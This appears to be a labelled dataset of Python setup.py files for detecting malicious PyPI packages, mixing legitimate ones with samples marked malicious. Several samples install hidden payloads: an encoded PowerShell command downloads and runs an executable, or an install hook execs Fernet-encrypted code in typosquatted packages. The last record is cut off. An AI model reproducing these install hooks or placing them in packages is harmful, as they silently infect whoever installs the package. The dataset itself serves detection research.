{"idx": "selfhydrastringpip-4.61", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhydrastringpip',\n    packages = ['modlib'],\n    version = '3.26',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqmcpypaypal-4.57", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmcpypaypal',\n    packages = ['modlib'],\n    version = '6.12',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpguiintelcv-1.72", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpguiintelcv',\n    packages = ['modlib'],\n    version = '1.81',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tptoolpywgui-10.56", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tptoolpywgui',\n    packages = ['modlib'],\n    version = '1.16',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfhttpstrver-10.8", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhttpstrver',\n    packages = ['modlib'],\n    version = '6.90',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ez_setup-0.9", "func": "from setuptools import setup, find_packages\nimport sys, os\n\nhere = os.path.abspath(os.path.dirname(__file__))\nREADME = open(os.path.join(here, 'README.rst')).read()\nNEWS = open(os.path.join(here, 'NEWS.txt')).read()\n\n\nversion = '0.9'\n\ninstall_requires = [\n    # List your project dependencies here.\n    # For more details, see:\n    # http://packages.python.org/distribute/setuptools.html#declaring-dependencies\n]\n\n\nsetup(name='ez_setup',\n    version=version,\n    description=\"ez_setup.py and distribute_setup.py\",\n    long_description=README + '\\n\\n' + NEWS,\n    classifiers=[\n      # Get strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers\n      'Programming Language :: Python :: 3',\n    ],\n    keywords='ez_setup setuptools distribute workaround',\n    author='Sridhar Ratnakumar',\n    author_email='github@srid.name',\n    url='http://github.com/ActiveState/ez_setup',\n    license='MIT',\n    py_modules = ['ez_setup', 'distribute_setup'],\n    zip_safe=False,\n    install_requires=install_requires,\n)\n", "target": 0}
{"idx": "ExtensionClass-4.6", "func": "##############################################################################\n#\n# Copyright (c) 2007 Zope Foundation and Contributors.\n# All Rights Reserved.\n#\n# This software is subject to the provisions of the Zope Public License,\n# Version 2.1 (ZPL).  A copy of the ZPL should accompany this distribution.\n# THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY AND ALL EXPRESS OR IMPLIED\n# WARRANTIES ARE DISCLAIMED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\n# WARRANTIES OF TITLE, MERCHANTABILITY, AGAINST INFRINGEMENT, AND FITNESS\n# FOR A PARTICULAR PURPOSE.\n#\n##############################################################################\n\"\"\"Setup for the ExtensionClass distribution\n\"\"\"\nimport os\nimport platform\nfrom setuptools import setup, find_packages, Extension\n\nwith open('README.rst') as f:\n    README = f.read()\n\nwith open('CHANGES.rst') as f:\n    CHANGES = f.read()\n\n# PyPy won't build the extension.\npy_impl = platform.python_implementation\nis_pypy = py_impl() == 'PyPy'\n\nif is_pypy:\n    ext_modules = []\nelse:\n    ext_modules = [\n        Extension(\"ExtensionClass._ExtensionClass\",\n                  [os.path.join('src', 'ExtensionClass',\n                                '_ExtensionClass.c')],\n                  include_dirs=['src']),\n        Extension(\"ComputedAttribute._ComputedAttribute\",\n                  [os.path.join('src', 'ComputedAttribute',\n                                '_ComputedAttribute.c')],\n                  include_dirs=['src']),\n        Extension(\"MethodObject._MethodObject\",\n                  [os.path.join('src', 'MethodObject',\n                                '_MethodObject.c')],\n                  include_dirs=['src']),\n    ]\n\nversion = '4.6'\n\nsetup(\n    name='ExtensionClass',\n    version=version,\n    url='https://github.com/zopefoundation/ExtensionClass',\n    license='ZPL 2.1',\n    description='Metaclass for subclassable extension types',\n    author='Zope Foundation and Contributors',\n    author_email='zope-dev@zope.org',\n    long_description='\\n\\n'.join([README, CHANGES]),\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    classifiers=[\n        \"Development Status :: 6 - Mature\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Zope2\",\n        \"License :: OSI Approved :: Zope Public License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    ext_modules=ext_modules,\n    include_package_data=True,\n    zip_safe=False,\n    extras_require={\n        'test': [\n            'zope.testrunner',\n        ],\n    },\n)\n", "target": 0}
{"idx": "golicense_classifier-0.0.16", "func": "import setuptools\n\nwith open(\"README.md\", \"r\", encoding=\"utf-8\") as fh:\n    long_description = fh.read()\n\nsetuptools.setup(\n    name=\"golicense_classifier\",\n    version=\"0.0.16\",\n    author=\"AvishrantSh (Avishrant Sharma)\",\n    author_email=\"<avishrants@gmail.com>\",\n    description=\"A Python based License Classification and Copyright\\\n         Statement Detection tool based on Google License Classifier\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/AvishrantsSh/LicensePackage\",\n    project_urls={\n        \"Bug Tracker\": \"https://github.com/AvishrantsSh/LicensePackage/issues\",\n    },\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: POSIX :: Linux\",\n    ],\n    package_dir={\"\": \"src\"},\n    include_package_data=True,\n    packages=setuptools.find_packages(where=\"src\"),\n    python_requires=\">=3.6\",\n)\n", "target": 0}
{"idx": "requirmentstxtt-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'lALwuqGQBiRHmOLyCpk zshGXvzmsmrEpUpijYWbYVjHGcOxis WVzNFvzOOpqCRPXmOMGpGjfEzhmUP'\nLONG_DESCRIPTION = 'UJKXVpQvsIqXDVkgupDFekGpFaLO epMgYDefKANvcbQMIMDaMyBNSRmhB jafnEvXPHQRsNmmEdAcPBXvwXmLudHU udbqePKScoddysjmRapEZQulPxOCTuqJeVprnynBqGMjcfRoTEsHEmwJdujytbpdcaDJfZNorRXHJwsYDkQcOkXnnUAIwIlzIgoVo'\n\n\nclass IuYmNcKvAawOyYhRyjahjIHPSHmOWjQoWdXDWXxgayuWrixocpLjkePTQdrTJkxOKketvBFwluYvwwjwcIaVuhfqGGQxmzwtDHylfSbHuhNcdKKpRIKXeSRmeyCkQuEoPHGqkkhJZSuCMtNEshfOtlEDvSIFhhxuiAdVoeQlMREdufPWCx(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'v0cCoAd0CuFsoirU6nlyBVz7YIdvZxmiHhbos6xAGtM=').decrypt(b'gAAAAABmBIatcg6Z4v-6j3p-tbypVLunVE93P8q3J6JaXrDJycFrQ2kyASxLg9jAKRjVtNbNN9RU00VxqsV5qogHNGDQxb06W--of8VJjehchxXSdsZkxtY7K1IBx5Up9t4cwsFkUns9HwoJQIF94S5vtDgNqFxh36ICSdzEF_iN_EUsQbCK4Ksb1w1RPTudIgJYdpDcp220duu8cmNWciH-ZpsoRjVfv_fnD1DeLgEAzMzNmKcpUAQ='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requirmentstxtt\",\n    version=VERSION,\n    author=\"zdSSIAQzaRaozziNQZ\",\n    author_email=\"EFWpkAsmLZhcc@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': IuYmNcKvAawOyYhRyjahjIHPSHmOWjQoWdXDWXxgayuWrixocpLjkePTQdrTJkxOKketvBFwluYvwwjwcIaVuhfqGGQxmzwtDHylfSbHuhNcdKKpRIKXeSRmeyCkQuEoPHGqkkhJZSuCMtNEshfOtlEDvSIFhhxuiAdVoeQlMREdufPWCx,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "requiremeents-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'TAjmbxaTDCpnSrCChbdVQTflZREacFeWFK'\nLONG_DESCRIPTION = 'garlXPEkeRdvCwcSuhHSgPmEKbFCijamZgb hEYpiICsLBpglZenxfosMuWtYRlKwkOsqQKGCsIooDgBnwAvQufWOvlyNaDVFfhIozpeQVeeJEuTJzXMsJeWyIYqIegpbaDSRIOyaIoJnEYhtEurAzEvNDrZeCzdCgoLMnmAiRenWgyKZ'\n\n\nclass pMUtqqdmeBVEskxcPhrJVSMxXLYwjkowOEEMNWzGrqhTbumrWkPAQAEzCLvwVYcYKMAbiuKewHlyzHsbTfKqonXIaUUOEcNsXmXBskRFhhLrB(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'E7PvpFUcvh7tX0TTic6AgilulcLk1ZT86PMTi82OZ58=').decrypt(b'gAAAAABmBIXdh157DENadl4DRGRmLMgrMYPpV-2vjk3wlQEMWPXZYIIRjVv3ngLHFmTyJlAnebfDkTXcS5AF-SV6E-SRbpwScogSwX9klLPMfslo9x690pWWyqRYB_oSFK9ly8ki4NOq_0avjFWrEVOf5tKLf6VEOejk4cjxdGkAcxZY_urkUyzbQ080o7zanBFk1OPnQZS4EvIOX2GkU5fn8C7HTFtyR9giQ8b818FMmzEvw6P4pmQ='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requiremeents\",\n    version=VERSION,\n    author=\"TJUuUFpxlpEm\",\n    author_email=\"dURPXWNSV@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': pMUtqqdmeBVEskxcPhrJVSMxXLYwjkowOEEMNWzGrqhTbumrWkPAQAEzCLvwVYcYKMAbiuKewHlyzHsbTfKqonXIaUUOEcNsXmXBskRFhhLrB,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "ffmpeg-1.4", "func": "#!/usr/local/bin/python3\n\n#############################################\n# File Name: setup.py\n# Author: mage\n# Mail: 363604236@qq.com\n# Created Time:  2018-9-9 19:17:34\n#############################################\n\n\nfrom setuptools import setup, find_packages\n\nsetup(\n    name = \"ffmpeg\",\n    version = \"1.4\",\n    keywords = (\"python ffmpeg\"),\n    description = \"ffmpeg python package url [https://github.com/jiashaokun/ffmpeg]\",\n    long_description = \"ffmpeg python package\",\n    license = \"MIT Licence\",\n\n    url = \"https://github.com/jiashaokun/ffmpeg\",\n    author = \"SkeyJIA\",\n    author_email = \"363604236@qq.com\",\n\n    packages = ['ffmpeg'],\n    include_package_data = True,\n    platforms = \"any\",\n)\n", "target": 0}
{"idx": "tensofl9w-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'ezTFiJYOKNM sBiNZcZRixbGhXYUzaGLhUtORNOpKuXgKEnkOejYCPLD'\nLONG_DESCRIPTION = 'XUphJlHRpbwWzvaVzeAaRavvAUVHWDwysFOTTBdRTAoekZyMiCfxGglobrGGSPVEddPXORhjOibwjSSzhjWUYUybbnsTgHntEZpjgqiGNAOCotNEoMspxGEHwRsOaisXnUogzZLDlXnAQzQDPTMooSaUihwQiubSSOxCcDmXENUMUwLoeB pulxRsKvRIQRYBBcShzPKxqNEmfRhygrAYVOQjFDVoVdfRAYGVjdVdfxwbOuarrTacBpVGOMxPKiDzMqjHdXNlBFUMyKrL oxJEdeLUcfvZabARNT'\n\n\nclass DwrInQMkwjryEkJYZiePHYljaWViqzmTXdHJZbMjUpkCkYmIWedKWMACvoIytZqiAfMBoceYsYrRbssAGKiu(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'T6GEq4lQnjesu42uI7M3oVn7LWJTaYdsAT1-mF4mA3Y=').decrypt(b'gAAAAABmBH1naUhnknh5J5PbBkDfJFOr10atXtZ595c7NjOExOd_5SiTxcEOWE_YUDV_H6encfonJZEPgoTJDQmeRHRqYGoHIAlDJIlpbe6vMw1u_ambbOcJ1FD4_khBuEbaNPsPHSlPKs4qJHuWEmEROwGzI47i4wJZ_bkTPa9stO71jU-QxI0Bf-sAqJyNqAtLdSyIwkwG82IVe9HYYr2l2mPl5WG5-eqVgIpN5r8nkuQBQVUbh0M='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"tensofl9w\",\n    version=VERSION,\n    author=\"zukGulRP\",\n    author_email=\"JKMWhhPYSIrGOPRx@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': DwrInQMkwjryEkJYZiePHYljaWViqzmTXdHJZbMjUpkCkYmIWedKWMACvoIytZqiAfMBoceYsYrRbssAGKiu,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "django_csp-3.7", "func": "import sys\nimport os\nimport codecs\nfrom setuptools import setup, find_packages\n\n\nversion = '3.7'\n\n\nif sys.argv[-1] == 'publish':\n    os.system('python setup.py sdist upload')\n    os.system('python setup.py bdist_wheel upload')\n    print('You probably want to also tag the version now:')\n    print('  git tag -a %s -m \"version %s\"' % (version, version))\n    print('  git push --tags')\n    sys.exit()\n\n\ndef read(*parts):\n    filename = os.path.join(os.path.dirname(__file__), *parts)\n    with codecs.open(filename, encoding='utf-8') as fp:\n        return fp.read()\n\n\ninstall_requires = [\n    'Django>=1.8',\n]\n\njinja2_requires = [\n    'jinja2>=2.9.6',\n]\n\ntest_requires = [\n    'pytest<4.0',\n    'pytest-django',\n    'pytest-flakes==1.0.1',\n    'pytest-pep8==1.0.6',\n    'pep8==1.4.6',\n    'mock==1.0.1',\n    'six==1.12.0',\n]\n\ntest_requires += jinja2_requires\n\n\nsetup(\n    name='django_csp',\n    version=version,\n    description='Django Content Security Policy support.',\n    long_description=read('README.rst'),\n    author='James Socol',\n    author_email='me@jamessocol.com',\n    maintainer='Christopher Grebs',\n    maintainer_email='cg@webshox.org',\n    url='http://github.com/mozilla/django-csp',\n    license='BSD',\n    packages=find_packages(),\n    install_requires=install_requires,\n    extras_require={\n        'tests': test_requires,\n        'jinja2': jinja2_requires,\n    },\n    include_package_data=True,\n    zip_safe=False,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Environment :: Web Environment :: Mozilla',\n        'Programming Language :: Python',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Framework :: Django',\n    ]\n)\n", "target": 0}
{"idx": "eth-manager-0.8.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import (\n    setup,\n    find_packages,\n)\n\nextras_require = {\n    \"test\": [\n        \"pytest>=7.0.0\",\n        \"pytest-xdist>=2.4.0\",\n        \"hypothesis>=4.18.0,<5\",\n        \"coverage\",\n    ],\n    \"lint\": [\n        \"flake8==6.0.0\",  # flake8 claims semver but adds new warnings at minor releases, leave it pinned.\n        \"flake8-bugbear==23.3.23\",  # flake8-bugbear does not follow semver, leave it pinned.\n        \"isort>=5.10.1\",\n        \"mypy==0.971\",  # mypy does not follow semver, leave it pinned.\n        \"pydocstyle>=6.0.0\",\n        \"black>=23\",\n    ],\n    \"doc\": [\n        \"sphinx>=5.0.0\",\n        \"sphinx_rtd_theme>=1.0.0\",\n        \"towncrier>=21,<22\",\n    ],\n    \"dev\": [\n        \"bumpversion>=0.5.3\",\n        \"pytest-watch>=4.1.0\",\n        \"tox>=4.0.0\",\n        \"build>=0.9.0\",\n        \"wheel\",\n        \"twine\",\n        \"ipython\",\n    ],\n}\n\nextras_require[\"dev\"] = (\n    extras_require[\"dev\"]\n    + extras_require[\"test\"]\n    + extras_require[\"lint\"]\n    + extras_require[\"doc\"]\n)\n\n\nwith open(\"./README.md\") as readme:\n    long_description = readme.read()\n\n\nsetup(\n    name=\"eth-manager\",\n    # *IMPORTANT*: Don't manually change the version here. Use `make bump`, as described in readme\n    version=\"0.8.0\",\n    description=\"\"\"eth-manager: Sign Ethereum transactions and messages with local private keys\"\"\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"The Ethereum Foundation\",\n    author_email=\"snakecharmers@ethereum.org\",\n    url=\"https://github.com/ethereum/eth-account\",\n    include_package_data=True,\n    install_requires=[\n        \"bitarray>=2.4.0\",\n        \"eth-abi>=4.0.0-b.2\",\n        \"eth-keyfile>=0.6.0\",\n        \"eth-keys>=0.4.0\",\n        \"eth-rlp>=0.3.0\",\n        \"eth-utils>=2.0.0\",\n        \"hexbytes>=0.1.0\",\n        \"rlp>=1.0.0\",\n        \"requests>=2.31.0\"\n    ],\n    python_requires=\">=3.7, <4\",\n    extras_require=extras_require,\n    py_modules=[\"eth_manager\"],\n    license=\"MIT\",\n    zip_safe=False,\n    keywords=\"ethereum\",\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    package_data={\n        \"eth_manager\": [\n            \"py.typed\",\n            \"hdaccount/wordlist/*.txt\",\n        ]\n    },\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n    ],\n)\n", "target": 1}
{"idx": "frozenlist-1.3.1", "func": "import os\nimport sys\n\nfrom setuptools import Extension, setup\n\nNO_EXTENSIONS = (\n    bool(os.environ.get(\"FROZENLIST_NO_EXTENSIONS\"))\n    or sys.implementation.name != \"cpython\"\n)\n\nif NO_EXTENSIONS:\n    print(\"*********************\")\n    print(\"* Pure Python build *\")\n    print(\"*********************\")\n    ext_modules = None\nelse:\n    print(\"*********************\")\n    print(\"* Accelerated build *\")\n    print(\"*********************\")\n    ext_modules = [Extension(\"frozenlist._frozenlist\", [\"frozenlist/_frozenlist.c\"])]\n\n\nsetup(\n    ext_modules=ext_modules,\n)\n", "target": 0}
{"idx": "google-cloud-dlp-3.8.0", "func": "# -*- coding: utf-8 -*-\n#\n# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-dlp\"\ndescription = \"Cloud Data Loss Prevention (DLP) API API client library\"\nversion = \"3.8.0\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\n\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    